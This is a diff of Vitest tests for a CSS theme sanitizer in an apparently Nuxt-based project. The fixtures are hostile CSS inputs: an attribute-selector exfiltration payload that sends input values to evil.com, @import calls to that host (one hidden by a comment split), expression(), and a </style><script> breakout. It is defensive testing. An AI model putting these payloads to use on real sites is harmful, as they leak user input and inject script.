@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest'
-import { isSafeUrl, validateZipArchive } from '../../server/utils/security'
+import { isSafeUrl, validateZipArchive, sanitizeThemeCss } from '../../server/utils/security'
 import { zipSync } from 'fflate'
 
 // Mock h3's createError global since it runs in Nuxt/h3 context
@@ -89,5 +89,61 @@ describe('ZIP Validation (validateZipArchive)', () => {
       'C:/windows.css': new TextEncoder().encode('body {}'),
     })
     expect(() => validateZipArchive(zipBytes3, 1000)).toThrow(/Directory traversal/)
+  })
+})
+
+describe('Theme CSS Sanitization (sanitizeThemeCss)', () => {
+  it('leaves ordinary declarative CSS untouched', () => {
+    const css = `:root { --nuxflow-primary: #00dc82; } .card { border-radius: 8px; padding: 1rem; }`
+    expect(sanitizeThemeCss(css)).toBe(css)
+  })
+
+  it('strips url() everywhere, closing the attribute-selector exfiltration vector', () => {
+    const css = `input[value^="a"] { background: url(https://evil.com/?leak=a); }`
+    const result = sanitizeThemeCss(css)
+    expect(result).not.toContain('evil.com')
+    expect(result).toContain('background: none')
+  })
+
+  it('strips url() regardless of quoting style', () => {
+    expect(sanitizeThemeCss(`a { background: url("https://evil.com/x.png"); }`)).not.toContain('evil.com')
+    expect(sanitizeThemeCss(`a { background: url('https://evil.com/x.png'); }`)).not.toContain('evil.com')
+    expect(sanitizeThemeCss(`a { background: url(https://evil.com/x.png); }`)).not.toContain('evil.com')
+  })
+
+  it('strips @import statements entirely', () => {
+    const css = `@import url(https://evil.com/tracker.css);\nbody { color: red; }`
+    const result = sanitizeThemeCss(css)
+    expect(result).not.toContain('@import')
+    expect(result).not.toContain('evil.com')
+    expect(result).toContain('body { color: red; }')
+  })
+
+  it('strips @import with a quoted string form', () => {
+    const css = `@import "https://evil.com/tracker.css";\nbody { color: red; }`
+    expect(sanitizeThemeCss(css)).not.toContain('evil.com')
+  })
+
+  it('strips constructs hidden inside comments before matching', () => {
+    const css = `@im/* hide */port url(https://evil.com/x.css);`
+    const result = sanitizeThemeCss(css)
+    expect(result).not.toContain('evil.com')
+  })
+
+  it('strips legacy IE expression()', () => {
+    const css = `.x { width: expression(alert(1)); }`
+    expect(sanitizeThemeCss(css)).not.toMatch(/expression\s*\(/)
+  })
+
+  it('strips </style> to prevent breaking out of the injected style block', () => {
+    const css = `body {}</style><script>alert(1)</script><style>`
+    expect(sanitizeThemeCss(css)).not.toContain('</style>')
+  })
+
+  it('is idempotent — sanitizing already-clean CSS twice produces the same output', () => {
+    const css = `:root { --nuxflow-primary: #00dc82; }`
+    const once = sanitizeThemeCss(css)
+    const twice = sanitizeThemeCss(once)
+    expect(twice).toBe(once)
   })
 })
